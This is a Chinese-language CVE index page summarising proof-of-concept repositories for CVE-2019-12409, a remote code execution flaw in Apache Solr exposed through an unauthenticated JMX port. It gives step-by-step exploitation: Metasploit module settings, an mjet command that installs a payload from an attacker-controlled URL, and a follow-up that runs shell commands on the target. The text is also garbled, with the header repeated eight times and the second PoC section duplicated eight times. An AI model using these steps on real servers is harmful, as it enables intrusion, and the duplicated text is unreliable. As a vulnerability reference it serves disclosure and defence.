# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

# CVE-2019-12409

> 📦 该CVE有 **2** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2019-12409-jas502n_CVE-2019-12409.md](../2019/CVE-2019-12409-jas502n_CVE-2019-12409.md)

## CVE-2019-12409 Apache Solr RCE

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行

**影响应用:** Apache Solr

**危害等级:** 高危，可完全控制服务器

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** 需要目标服务器开启JMX且18983端口对外开放, 并且使用存在漏洞的默认配置 solr.in.sh

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞是由于 Apache Solr 8.1.1 和 8.2.0 版本中默认的 `solr.in.sh` 配置文件中 `ENABLE_REMOTE_JMX_OPTS` 配置项存在不安全设置引起的远程代码执行漏洞。如果使用了受影响版本的默认 `solr.in.sh` 文件，则 JMX 监控将在 RMI_PORT（默认 18983）上启用并暴露，且无需身份验证。如果防火墙允许入站流量访问此端口，则任何具有网络访问权限的人都可以访问 JMX，进而可以上传恶意代码在 Solr 服务器上执行。

**有效性：**
提供的POC代码显示了两种利用方式，使用 Metasploit 和 mjet 工具。 Metasploit 模块 `exploit/multi/misc/java_jmx_server` 被成功用于获取 Meterpreter shell。mjet 工具也提供了安装和执行命令的方式，并且提供了攻击示例，这些都表明POC代码是有效的，可以用于远程代码执行。

**投毒风险：**
*   **README.md:**  包含漏洞描述和利用截图，没有发现恶意代码。
*   **solr.in.sh:** 展示了启用 `ENABLE_REMOTE_JMX_OPTS` 的配置，没有发现恶意代码。
*   **nmap 扫描信息:** 只是端口扫描结果，没有恶意代码。
*   **Metasploit 利用过程:**  使用了 Metasploit 框架的标准模块，风险较低。
*   **mjet 工具利用过程:**  `mjet.py` 是一个 Python 脚本，可能存在风险。`jython-standalone-2.7.0.jar` 是 Jython 解释器，也可能存在风险。`qgmncrbu.jar` 是恶意 payload，风险最高。

总体来看，主要风险在于`mjet.py`脚本和恶意payload `qgmncrbu.jar`，可能存在投毒代码，但是没有进一步分析，因此根据经验判断投毒风险为10%。

**利用方式：**
1.  **确定目标 Solr 服务器版本:** 确认目标服务器运行的是 Apache Solr 8.1.1 或 8.2.0。
2.  **检查 JMX 端口 (18983) 是否开放:** 使用 `nmap` 或类似工具扫描目标服务器的 18983 端口，确认端口是否对外开放。
3.  **使用 Metasploit:**
    *   加载 `exploit/multi/misc/java_jmx_server` 模块。
    *   设置 `RHOSTS` 为目标服务器 IP 地址。
    *   设置 `RPORT` 为 18983。
    *   设置 `LHOST` 和 `LPORT` 为攻击者监听地址和端口。
    *   运行 `exploit` 命令。
4.  **使用 mjet 工具：**
    *   使用 Jython 运行 `mjet.py` 脚本，指定目标 IP 地址、端口和 payload URL。
    *   例如：`java -jar jython-standalone-2.7.0.jar mjet.py <target_ip> 18983 install super_secret http://<attacker_ip>:8000/ 8000`
    *   然后，可以使用 `command` 参数执行任意命令。 例如： `java -jar jython-standalone-2.7.0.jar mjet.py 127.0.0.1 18983 command super_secret "id&&pwd&&ls"`

**项目地址:** [jas502n/CVE-2019-12409](https://github.com/jas502n/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---



---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---



---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---



---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---



---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---



---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---



---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---



---

## POC #2

**来源**: [CVE-2019-12409-mbadanoiu_CVE-2019-12409.md](../2019/CVE-2019-12409-mbadanoiu_CVE-2019-12409.md)

## CVE-2019-12409: Apache Solr RCE via JMX

**漏洞编号:** CVE-2019-12409

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Apache Solr

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** 8.1.1 and 8.2.0 for Linux

**利用条件:** ENABLE_REMOTE_JMX_OPTS 必须为 true, 并且 RMI_PORT (默认 18983) 对外开放且无认证。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2019-12409 漏洞存在于 Apache Solr 8.1.1 和 8.2.0 的 Linux 版本中。由于默认配置文件 `solr.in.sh` 中 `ENABLE_REMOTE_JMX_OPTS` 选项被设置为 `true`，并且 JMX 端口默认无需身份验证，攻击者可以通过 JMX 接口上传恶意代码并在 Solr 服务器上执行，从而实现远程代码执行。搜索引擎结果表明该漏洞已经被广泛披露，多个安全厂商都发布了相关的分析和预警。漏洞利用代码指向了多个PoC，包括使用 mjet 和 beanshooter 等工具，证明漏洞利用是可行的。尽管提供的漏洞利用代码本身只是一个README.md文件，但是它链接到了多个有效的PoC利用工具，因此可以确认漏洞利用的有效性。关于投毒风险，由于该仓库只是提供漏洞信息和PoC链接，没有直接提供可执行的代码，因此投毒风险较低。但鉴于链接指向的PoC代码可能存在潜在的风险，所以投毒可能性评估为10%。

**利用方式：**
1.  **检查配置：** 确认受影响的 Apache Solr 版本为 8.1.1 或 8.2.0 (Linux)，并且 `solr.in.sh` 文件中 `ENABLE_REMOTE_JMX_OPTS` 设置为 `true`。
2.  **端口扫描：** 确认 RMI_PORT (默认 18983) 对外开放且没有防火墙限制。
3.  **JMX 连接：** 使用 JMX 客户端连接到 Solr 服务器的 RMI 端口。
4.  **恶意代码上传：** 通过 JMX 接口上传恶意代码 (例如，包含反序列化漏洞的 JAR 文件)。
5.  **代码执行：** 利用 JMX 接口触发恶意代码执行，从而获得服务器控制权。

**项目地址:** [mbadanoiu/CVE-2019-12409](https://github.com/mbadanoiu/CVE-2019-12409)

**漏洞详情:** [CVE-2019-12409](https://nvd.nist.gov/vuln/detail/CVE-2019-12409)

---

